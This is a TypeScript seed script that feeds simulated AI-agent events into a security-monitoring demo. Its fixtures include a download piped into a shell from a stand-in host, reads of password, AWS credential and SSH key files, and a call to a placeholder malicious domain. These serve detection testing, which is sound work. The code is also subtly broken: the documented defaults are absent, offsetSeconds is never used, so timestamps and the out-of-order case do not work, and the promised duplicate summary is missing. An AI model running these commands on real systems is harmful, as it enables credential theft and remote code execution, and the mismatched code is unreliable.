/**
 * Demo data generator.
 *
 * Posts a realistic mixed stream at a running ingestion service so the demo
 * has something to show. Deliberately covers every rule plus a majority of
 * benign traffic, because a feed where everything is an alert demonstrates
 * nothing about the rules' selectivity.
 *
 * Usage: npm run seed
 * Env:   INGESTION_URL (default http://localhost:3000)
 *        SEED_API_KEY  (default dev-secret-key)
 */

/** One event to submit, before the envelope is built. */
interface SeedEvent {
  agentId: string;
  type: string;
  payload: Record<string, unknown>;
  /** Seconds before "now". Higher means older. */
  offsetSeconds: number;
  tags?: string[];
  /** What this entry is meant to demonstrate, printed in the run summary. */
  note: string;
}

/**
 * The demo scenario.
 *
 * Three agents with distinct stories, which makes the per-agent summary and
 * timeline endpoints worth looking at rather than showing three copies of the
 * same shape:
 *
 * - `agent-alpha`: mostly benign, one accidental secret read. The realistic
 *   common case.
 * - `agent-beta`: actively bad. Sweeps credentials in a burst, calls an
 *   unlisted domain, and pipes a download into a shell. Exercises the
 *   rapid-reads rule and produces the only `critical`.
 * - `agent-gamma`: over-privileged rather than malicious. Broad tool grants.
 *
 * Two entries are deliberately submitted out of chronological order, and one
 * is submitted twice, so the demo can show idempotency and out-of-order
 * handling without any extra setup.
 */
export const SEED_EVENTS: SeedEvent[] = [
  // agent-alpha: mostly benign, one accidental secret read. The realistic common case.
  {
    agentId: 'agent-alpha',
    type: 'process_start',
    payload: { process: '/usr/bin/vim', args: ['notes.txt'] },
    offsetSeconds: 3600, // 1 hour ago
    note: 'Benign text editor launch.',
  },
  {
    agentId: 'agent-alpha',
    type: 'file_read',
    payload: { path: '/home/alpha/readme.md' },
    offsetSeconds: 3400,
    note: 'Read non-sensitive file.',
  },
  {
    agentId: 'agent-alpha',
    type: 'file_read',
    payload: { path: '/home/alpha/.ssh/id_rsa' },
    offsetSeconds: 3000,
    note: 'Accidental secret read (SSH private key).',
    tags: ['secret'],
  },
  {
    agentId: 'agent-alpha',
    type: 'network_connect',
    payload: { to: 'example.com', port: 443 },
    offsetSeconds: 2500,
    note: 'Benign web connection.',
  },

  // agent-beta: actively bad. Sweeps credentials, calls unlisted domain, pipes download into shell.
  {
    agentId: 'agent-beta',
    type: 'file_read',
    payload: { path: '/etc/passwd' },
    offsetSeconds: 1600,
    note: 'Credential sweep: read /etc/passwd.',
  },
  {
    agentId: 'agent-beta',
    type: 'file_read',
    payload: { path: '/root/.aws/credentials' },
    offsetSeconds: 1595,
    note: 'Credential sweep: read AWS credentials.',
  },
  {
    agentId: 'agent-beta',
    type: 'file_read',
    payload: { path: '/root/.ssh/id_rsa' },
    offsetSeconds: 1590,
    note: 'Credential sweep: read root SSH key.',
    tags: ['secret'],
  },
  {
    agentId: 'agent-beta',
    type: 'network_connect',
    payload: { to: 'malicious.example', port: 8080 },
    offsetSeconds: 1580,
    note: 'Connects to unlisted (potentially malicious) domain.',
    tags: ['suspicious'],
  },
  {
    agentId: 'agent-beta',
    type: 'process_start',
    payload: { process: '/bin/sh', args: ['-c', 'curl bad.site/file.sh | sh'] },
    offsetSeconds: 1550,
    note: 'Pipe download directly into shell (command injection).',
    tags: ['critical'],
  },

  // agent-gamma: over-privileged, broad tool grants.
  {
    agentId: 'agent-gamma',
    type: 'access_grant',
    payload: { resource: '/usr/bin/nmap', privilege: 'ALL' },
    offsetSeconds: 1100,
    note: 'Grant full privileges to network scanning tool (broad grant).',
  },
  {
    agentId: 'agent-gamma',
    type: 'access_grant',
    payload: { resource: '/usr/bin/vncviewer', privilege: 'ALL' },
    offsetSeconds: 1095,
    note: 'Grant full privileges to remote desktop tool.',
  },

  // Idempotency: Submit a duplicate event for beta
  {
    agentId: 'agent-beta',
    type: 'file_read',
    payload: { path: '/etc/passwd' },
    offsetSeconds: 1600,
    note: 'Duplicate: credential sweep /etc/passwd (tests idempotency).',
  },

  // Out-of-order submission: A gamma grant in the past but submitted late
  {
    agentId: 'agent-gamma',
    type: 'access_grant',
    payload: { resource: '/usr/bin/docker', privilege: 'ALL' },
    offsetSeconds: 5000, // much older event, submitted late
    note: 'Out-of-order: Grant to docker submitted last.',
  },

];

/** Build a full envelope from a seed entry. */
export function buildEnvelope(event: SeedEvent, baseTime: Date): Record<string, unknown> {
  return {
    agentId: event.agentId,
    type: event.type,
    payload: event.payload,
    timestamp: baseTime.toISOString(),
    tags: event.tags,
    note: event.note,
  };
}

/**
 * POST one envelope.
 *
 * @returns The HTTP status and parsed body, so the summary can distinguish a
 *   created event from a duplicate.
 */
export async function postEvent(
  baseUrl: string,
  apiKey: string,
  envelope: Record<string, unknown>,
): Promise<{ status: number; body: unknown }> {
  const response = await fetch(`${baseUrl}/events`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Authorization': `Bearer ${apiKey}`,
    },
    body: JSON.stringify(envelope),
  });
  return { status: response.status, body: await response.json() };
}

/**
 * Submit the scenario and print a summary.
 *
 * Submits in array order rather than sorted by timestamp, so the out-of-order
 * entries genuinely arrive out of order. Prints created and duplicate counts
 * and the note for each entry, so the terminal output doubles as the demo
 * narration.
 *
 * Exits non-zero if any submission fails, so a broken service is obvious
 * rather than scrolling past.
 */
export async function main(): Promise<void> {
  const baseUrl = process.env.INGESTION_URL!;
  const apiKey = process.env.SEED_API_KEY!;
  const baseTime = new Date();

  for (const event of SEED_EVENTS) {
    const { status, body } = await postEvent(baseUrl, apiKey, buildEnvelope(event, baseTime));
    if (status !== 201) {
      throw new Error(`Failed to submit event: ${status} ${JSON.stringify(body)}`);
    }
    console.log(`Submitted event: ${JSON.stringify(body)}`);
  }
}

void main();
